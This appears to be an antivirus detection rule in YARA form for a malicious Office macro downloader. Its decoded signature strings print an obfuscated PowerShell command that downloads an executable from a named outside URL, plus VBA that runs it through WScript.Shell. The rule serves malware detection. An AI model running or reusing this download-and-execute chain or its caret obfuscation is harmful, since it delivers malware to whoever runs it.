
rule TrojanDownloader_O97M_EncDoc_RVS_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RVS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {77 65 5e 62 72 65 2a 71 75 65 73 74 2d 75 5e 72 69 22 22 68 74 74 70 3a 2f 2f 6c 6f 73 74 68 65 61 76 65 6e 2e 63 6f 6d 2e 63 6e 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 69 64 33 2f 64 6f 63 5f 31 30 38 36 5f 30 33 36 70 64 66 2e 65 78 65 22 22 2d 6f 75 74 2a 66 69 6c 65 24 74 65 6d 70 66 69 6c 65 3b } //1 we^bre*quest-u^ri""http://lostheaven.com.cn/wp-includes/id3/doc_1086_036pdf.exe""-out*file$tempfile;
		$a_01_1 = {72 65 70 6c 61 63 65 28 69 73 6b 74 65 2c 22 5e 22 2c 22 22 29 73 65 74 69 63 66 79 69 3d 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 73 65 74 69 63 66 79 69 65 78 65 63 3d 69 63 66 79 69 2e 65 78 65 63 28 69 73 6b 74 65 29 } //1 replace(iskte,"^","")seticfyi=createobject("wscript.shell")seticfyiexec=icfyi.exec(iskte)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}